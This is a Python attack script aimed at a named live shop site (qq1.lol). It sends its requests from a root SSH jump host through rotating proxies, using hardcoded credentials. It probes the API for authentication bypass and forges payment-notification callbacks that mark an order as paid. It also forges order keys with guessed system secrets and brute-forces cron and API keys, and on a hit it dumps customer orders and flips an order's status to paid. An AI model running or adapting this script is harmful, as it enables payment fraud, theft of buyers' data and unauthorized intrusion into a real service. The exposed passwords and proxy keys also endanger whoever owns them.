#!/usr/bin/env python3
"""qq1.lol deep7 — POST auth mapping, pay capture, notify/cron/skey, expanded tools keys."""
import hashlib
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, urlparse, parse_qs

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
LOG = OUT / "deep7.log"
HITS = OUT / "deep7_hits.jsonl"
REPORT = OUT / "deep7_report.json"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_deep7.jar"
_px = None
report = {"ts": datetime.now().isoformat(), "findings": [], "tests": []}


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    report["findings"].append(rec)
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def ssh(script, timeout=60):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=20", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout, errors="replace",
    ).stdout or ""


def proxy(force=False):
    global _px
    for _ in range(6):
        try:
            if _px and not force:
                return _px
            raw = ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 25)
            d = json.loads(raw)
            if d.get("code") == "SUCCESS" and d.get("data"):
                _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
                log(f"proxy {_px.split('@')[1]}")
                return _px
            log(f"proxy retry: {raw[:120]}")
        except Exception as e:
            log(f"proxy err: {e}")
        time.sleep(2)
        force = True
        _px = None
    return None


def curl(url, post=None, mt=20, force_px=False, headers=None):
    """Run curl on China jump via QG. post: dict or str."""
    px = proxy(force_px)
    if not px:
        return "", "000"
    # Build remote python curl to avoid shell quoting hell
    py = f"""
import subprocess,urllib.parse
url={url!r}
post={post!r}
px={px!r}
jar={JAR!r}
cmd=["curl","-sk","--max-time",str({mt}),"-x",px,"-b",jar,"-c",jar,"-A","Mozilla/5.0",
     "-H","Referer: https://qq1.lol/","-H","X-Requested-With: XMLHttpRequest",
     "-H","Content-Type: application/x-www-form-urlencoded","-w","\\n__HTTP:%{{http_code}}"]
if post is not None:
    if isinstance(post, dict):
        body=urllib.parse.urlencode(post)
    else:
        body=str(post)
    cmd += ["-X","POST","-d",body]
cmd.append(url)
r=subprocess.run(cmd,capture_output=True,text=True,timeout={mt}+5)
print(r.stdout or "", end="")
"""
    out = ssh(f"python3 - <<'PY'\n{py}\nPY", mt + 30)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def rec(name, body, code=""):
    report["tests"].append({"name": name, "code": code, "body": (body or "")[:500]})
    log(f"  {name}: HTTP={code} {(body or '')[:160]}")


def section_auth_map():
    log("=== AUTH MAP (change/tools/orders/search) ===")
    tests = [
        ("change_GET_all", f"{BASE}/%61pi.php?act=change&id=25949&zt=1&key=test", None),
        ("change_GET_idzt_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "test"}),
        ("change_GET_id_POST_ztkey", f"{BASE}/%61pi.php?act=change&id=25949", {"zt": "1", "key": "test"}),
        ("change_POST_all", f"{BASE}/%61pi.php?act=change", {"id": "25949", "zt": "1", "key": "test"}),
        ("change_GET_idzt_POST_wrong", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "definitely_wrong_key_xyz"}),
        ("change_GET_idzt_POST_empty", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": ""}),
        ("tools_GET", f"{BASE}/%61pi.php?act=tools&key=test&limit=1", None),
        ("tools_POST", f"{BASE}/%61pi.php?act=tools", {"key": "test", "limit": "1"}),
        ("orders_GET", f"{BASE}/%61pi.php?act=orders&key=test&limit=1&tid=102", None),
        ("orders_POST", f"{BASE}/%61pi.php?act=orders", {"key": "test", "limit": "1", "tid": "102"}),
        ("orders_sign_GET", f"{BASE}/%61pi.php?act=orders&key=test&sign=1&limit=1&tid=102", None),
        ("search_GET", f"{BASE}/%61pi.php?act=search&id=25949&key=test", None),
        ("search_POST", f"{BASE}/%61pi.php?act=search", {"id": "25949", "key": "test"}),
        ("clone_GET", f"{BASE}/%61pi.php?act=clone&key=test", None),
        ("token_GET", f"{BASE}/%61pi.php?act=token&key=test", None),
        ("goodslist_POST", f"{BASE}/%61pi.php?act=goodslist", {}),
        ("goodsdetails_POST", f"{BASE}/%61pi.php?act=goodsdetails", {"tid": "102"}),
        ("getleftcount_POST", f"{BASE}/%61pi.php?act=getleftcount", {"tid": "102"}),
    ]
    for name, url, post in tests:
        body, code = curl(url, post)
        rec(name, body, code)
        if body and ("成功" in body or '"code":1' in body or '"code":0' in body) and "错误" not in body and "请提供" not in body:
            if name.startswith(("goodslist", "goodsdetails", "getleftcount", "siteinfo", "classlist")):
                pass  # expected unauth
            else:
                hit("auth_bypass_or_ok", name, body)
        time.sleep(0.3)


def section_pay_capture():
    log("=== PAY CAPTURE ===")
    ssh(f"rm -f {JAR}")
    proxy(True)
    curl(f"{BASE}/")
    buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    for _ in range(3):
        if buy and "hashsalt" in buy:
            break
        buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=True)
        time.sleep(1)
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    if not csrf or not hs_m:
        log("no buy tokens")
        return None
    hs = subprocess.run(
        ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
        capture_output=True, text=True, timeout=8,
    ).stdout.strip()
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        {
            "tid": "102", "num": "1", "inputvalue": "deep7pay",
            "csrf_token": csrf.group(1), "hashsalt": hs,
            "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
        },
    )
    rec("ajax_pay", pay)
    tn = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    tn = tn.group(1) if tn else None
    if not tn:
        return None
    log(f"trade_no={tn}")
    report["trade_no"] = tn

    # payment types from pay response
    for typ in ["alipay", "wxpay", "qqpay", "usdt", "rmb"]:
        sub, code = curl(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
        rec(f"submit_{typ}", (sub or "")[:800], code)
        # extract forms / redirects / pid / key hints
        if sub:
            (OUT / f"deep7_submit_{typ}.html").write_text(sub[:100000], errors="replace")
            for pat in [r'name=["\']pid["\'][^>]*value=["\']([^"\']+)', r'pid=([0-9]+)',
                        r'name=["\']key["\'][^>]*value=["\']([^"\']+)', r'money["\']?\s*[:=]\s*["\']?([0-9.]+)',
                        r'https?://[^"\'\s]+', r'action=["\']([^"\']+)']:
                ms = re.findall(pat, sub, re.I)
                if ms:
                    log(f"  extract {typ} {pat[:30]} -> {ms[:5]}")
                    report.setdefault("pay_extract", {}).setdefault(typ, {})[pat[:40]] = ms[:20]
        time.sleep(0.4)

    # notify forge attempts with known trade_no
    log("--- notify forge ---")
    for path in [
        f"{BASE}/other/notify.php",
        f"{BASE}/other/notify.php?type=alipay",
        f"{BASE}/ajax.php?act=notify",
        f"{BASE}/pay/notify.php",
        f"{BASE}/epay/notify.php",
    ]:
        for post in [
            {"out_trade_no": tn, "trade_no": tn, "trade_status": "TRADE_SUCCESS", "money": "1", "pid": "1", "sign": "test"},
            {"out_trade_no": tn, "trade_status": "TRADE_SUCCESS", "type": "alipay", "sign": hashlib.md5(tn.encode()).hexdigest()},
            None,
        ]:
            body, code = curl(path if post is None else path, post if post else None)
            # GET variant
            if post is None:
                body, code = curl(f"{path}?out_trade_no={tn}&trade_status=TRADE_SUCCESS&sign=test")
            rec(f"notify {path.split(BASE)[1]} post={bool(post)}", body, code)
            if body and any(x in body for x in ["success", "SUCCESS", "成功", "ok"]) and "失败" not in body and "错误" not in body and "签名" not in body:
                hit("notify_possible", path, body)
            time.sleep(0.25)
    return tn


def section_skey_query(tn):
    log("=== SKEY / QUERY ===")
    # unpaid should not appear
    for q in [tn, "deep7pay", "chgprobe"]:
        body, code = curl(f"{BASE}/ajax.php?act=query", {"qq": q})
        rec(f"query_qq_{q}", body, code)
        body2, code2 = curl(f"{BASE}/?mod=query&data={quote(q)}")
        if "skey" in (body2 or "") or "kmdata" in (body2 or "") or "卡密" in (body2 or ""):
            hit("query_leak", q, body2[:2000])
        time.sleep(0.3)

    # forge skey = md5(id + SYS_KEY + id) with candidate SYS_KEYs
    syskeys = [
        "1", "123456", "buyi", "qq1", "qq1.lol", "SYS_KEY", "syskey", "faka",
        "rainbow", "caihong", "830603", "qqkqq", "buyiq", "admin", "password",
        hashlib.md5(b"buyi").hexdigest(), hashlib.md5(b"qq1").hexdigest(),
    ]
    oid = 25949
    for sk in syskeys:
        skey = hashlib.md5(f"{oid}{sk}{oid}".encode()).hexdigest()
        body, code = curl(f"{BASE}/ajax.php?act=order", {"id": str(oid), "skey": skey})
        if body and "验证失败" not in body and "请登录" not in body and body.strip():
            if "危险" in body or "<html" in body.lower():
                continue
            hit("skey_forge", f"oid={oid} sys={sk}", body)
            rec(f"skey_{sk}", body, code)
        time.sleep(0.15)


def section_cron_misc():
    log("=== CRON / MISC ===")
    keys = ["buyi", "qq1", "123456", "admin", "cron", "monitor", "jiankong", "faka",
            hashlib.md5(b"buyi").hexdigest(), "qqkqq", "QQKZC"]
    for k in keys:
        for url in [
            f"{BASE}/cron.php?key={quote(k)}",
            f"{BASE}/cron.php?key={quote(k)}&do=pricejk",
            f"{BASE}/cron.php?key={quote(k)}&do=updatestatus",
        ]:
            body, code = curl(url)
            if body and "不正确" not in body and "监控密钥" not in body and body.strip() and "<html" not in body.lower()[:50]:
                hit("cron", f"key={k}", body)
            time.sleep(0.1)

    # ajax acts that might leak
    for act, post in [
        ("getshareid", {"id": "1"}),
        ("gift_start", {}),
        ("cart_info", {}),
        ("getleftcount", {"tid": "102"}),
        ("checklogin", {}),
        ("getconfig", {}),
        ("siteinfo", {}),
        ("getmoney", {}),
        ("getuser", {}),
        ("orderlist", {}),
        ("getorder", {"id": "25949"}),
        ("admin", {"do": "login"}),
    ]:
        body, code = curl(f"{BASE}/ajax.php?act={act}", post if post else "")
        rec(f"ajax_{act}", body, code)
        if body and '"code":0' in body and act in ("getconfig", "siteinfo", "getmoney", "getuser", "orderlist", "admin"):
            hit("ajax_leak", act, body)
        time.sleep(0.25)


def section_tools_expand():
    log("=== TOOLS KEY EXPAND (local via jump, ~400) ===")
    base = [
        "buyi", "buyiq", "qqkqq", "qq1", "qq1lol", "QQKZC", "kawei", "ka1",
        "faka", "apikey", "api_key", "ApiKey", "token", "secret", "key",
        "12345678", "87654321", "qwerty", "asdfgh", "zxcvbn", "password1",
        "abc123", "abc123456", "qq123456", "by123456", "by888888",
        "t.me/qqkqq", "t.me/buyi", "telegram", "布衣发卡", "布衣",
        "20251101", "2025-11-01", "build2025", "mckuai", "ds_shop",
        "ymtd", "zibovip", "qqzwb", "open-api",
    ]
    keys = []
    for w in base:
        for s in ["", "123", "888", "666", "2024", "2025", "2026", "!", "@", "#", "001", "key", "api"]:
            keys.append(w + s)
            keys.append((w + s).upper())
        keys.append(hashlib.md5(w.encode()).hexdigest())
        keys.append(hashlib.md5((w + "123").encode()).hexdigest())
    # unique
    seen = set()
    uniq = []
    for k in keys:
        if k not in seen:
            seen.add(k)
            uniq.append(k)
    log(f"testing {len(uniq)} tools keys")
    tested = 0
    for k in uniq:
        body, _ = curl(f"{BASE}/%61pi.php?act=tools&key={quote(k)}&limit=2")
        tested += 1
        if not body:
            continue
        if "密钥错误" in body or "确保各项" in body or "No Act" in body:
            pass
        elif body.startswith("[") or ('"tid"' in body and "错误" not in body):
            hit("TOOLS_KEY", k, body)
            (OUT / "TOOLS_KEY_HIT.txt").write_text(k + "\n" + body[:5000])
            # dump orders
            o, _ = curl(f"{BASE}/%61pi.php?act=orders&key={quote(k)}&limit=20&tid=102")
            (OUT / "TOOLS_ORDERS.json").write_text((o or "")[:200000])
            # try mark paid via change
            c, _ = curl(f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": k})
            hit("change_with_key", k, c)
            break
        elif "请提供" not in body and "<html" not in body.lower()[:30]:
            log(f"  unusual key={k!r}: {body[:120]}")
        if tested % 50 == 0:
            log(f"  tools tested {tested}/{len(uniq)}")
            proxy(True)
        time.sleep(0.12)
    report["tools_tested"] = tested


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    open(LOG, "w").write("")
    log("=== DEEP7 START ===")
    section_auth_map()
    tn = section_pay_capture()
    section_skey_query(tn)
    section_cron_misc()
    section_tools_expand()
    REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"=== DEEP7 DONE findings={len(report['findings'])} ===")


if __name__ == "__main__":
    main()
